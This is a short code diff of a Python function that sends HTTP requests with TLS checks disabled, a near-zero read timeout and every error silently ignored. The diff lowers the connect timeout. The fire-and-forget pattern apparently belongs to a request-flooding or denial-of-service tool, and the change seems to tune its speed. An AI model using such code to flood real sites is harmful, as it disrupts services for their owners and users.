@@ -71,17 +71,17 @@ def dname():
 def sakura(url, headers, b, boo='x'):
     if b == "a":
      try:
-      requests.post(url=url, headers=headers, data=boo, verify=False, timeout=(0.68, 0.00001))
+      requests.post(url=url, headers=headers, data=boo, verify=False, timeout=(0.42, 0.00001))
      except Exception as e:
       pass 
     elif b == "x" :
      try:
-      requests.request(method='GET', url=url, headers=headers, data=boo, verify=False, timeout=(0.68, 0.00001))
+      requests.request(method='GET', url=url, headers=headers, data=boo, verify=False, timeout=(0.42, 0.00001))
      except Exception as e:
       pass 
     else:
      try:     
-      requests.get(url=url, headers=headers, verify=False, timeout=(0.68, 0.00001))
+      requests.get(url=url, headers=headers, verify=False, timeout=(0.42, 0.00001))
      except Exception as e:
       pass 
 
